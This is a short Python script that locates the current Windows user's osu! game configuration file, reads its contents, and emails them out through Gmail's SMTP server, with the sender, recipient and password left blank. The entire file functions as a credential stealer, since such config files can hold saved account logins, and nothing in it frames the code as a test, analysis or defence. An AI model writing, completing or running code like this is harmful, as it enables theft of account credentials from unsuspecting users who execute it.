import smtplib
import email.message
import getpass 


server = smtplib.SMTP('smtp.gmail.com:587')


user = getpass.getuser()
filepath = "C:\\Users\\" + user + "\\AppData\\Local\\osu!" + "\\osu!." + user + ".cfg"
testpath = "C:\\Users\\1\\AppData\\Local\\osu!\\osu!.1.cfg"


myStr = ""

with open(testpath) as f:
    lines = f.readlines()
    myStr = myStr + str(lines)



email_content = myStr




msg = email.message.Message()
msg['Subject'] = ''
 

msg['From'] = ''
msg['To'] = ''
password = ""
msg.add_header('Content-Type', 'text')

msg.set_payload(email_content)

s = smtplib.SMTP('smtp.gmail.com: 587')
s.starttls()
 
# Login Credentials for sending the mail
s.login(msg['From'], password)
 
s.sendmail(msg['From'], [msg['To']], msg.as_string())
